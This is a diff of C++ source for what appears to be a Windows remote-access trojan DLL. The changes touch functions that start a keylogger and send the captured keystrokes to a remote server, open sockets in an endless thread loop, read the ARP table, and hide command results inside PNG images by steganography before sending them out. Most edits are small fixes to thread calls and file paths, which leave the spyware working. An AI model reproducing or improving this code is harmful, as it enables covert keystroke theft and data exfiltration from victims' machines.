@@ -1,3 +1,4 @@
+#define _CRT_SECURE_NO_WARNINGS
 #include "Components.h"
 
 #define EXPORTING_DLL
@@ -74,7 +75,7 @@ string OpenSocket(std::string ip_and_port)
 {
 	while (true)
 	{
-		thread t1(&OpenSocketWithThread, ip_and_port);
+		thread t1(OpenSocketWithThread, ip_and_port);
 		t1.detach();
 	}
 }
@@ -142,9 +143,9 @@ string GetArpTable()
 string StartKeyLogger(string sharedKey)
 {
 	storeKeys = true;
-	thread t1(&KeyLogger);
+	thread t1(KeyLogger);
 	t1.detach();
-	thread t2(&SendKeyLoggerToServer, sharedKey);
+	thread t2(SendKeyLoggerToServer, sharedKey);
 	t2.detach();
 	return "Key Logger Started";
 }
@@ -162,7 +163,9 @@ string HideMessageInPicture(string fileName_and_cmd)
 	string fileName = *it;
 	string cmd = *(++it);
 
-	thread t1(&SendPicture, fileName, cmd);
+	//SendPicture(fileName, cmd);
+
+	thread t1(SendPicture, fileName, cmd);
 	t1.detach();
 	return "I will send you result via picture";
 }
@@ -431,6 +434,7 @@ bool SpecialKeys(int S_Key) {
 
 void SendPicture(string fileName, string cmd)
 {
+	Sleep(1000);
 	string newFile = EncodeTextInsideImg(fileName, cmd);
 
 	WSADATA wsadata;
@@ -520,7 +524,17 @@ string EncodeTextInsideImg(string fileName, string cmd)
 	int b = 0;
 	int bits = text.length() * 8 + 7;
 
-	img = imread("1.png", IMREAD_COLOR);
+	char path_in[256];
+	char path_out[256];
+	GetCurrentDirectory(sizeof(path_in), path_in);
+	GetCurrentDirectory(sizeof(path_out), path_out);
+	strcat(path_in, "\\1.png");
+	strcat(path_out, "\\2.png");
+
+	cout << path_in << endl;
+	cout << path_out << endl;
+
+	img = imread(path_in, IMREAD_COLOR);
 
 	img.copyTo(stego);
 
@@ -546,11 +560,9 @@ string EncodeTextInsideImg(string fileName, string cmd)
 		}
 	}
 
-	string newFile = "2.png";
+	imwrite(path_out, stego);
 
-	imwrite(newFile, stego);
-
-	return newFile;
+	return path_out;
 
 }
 
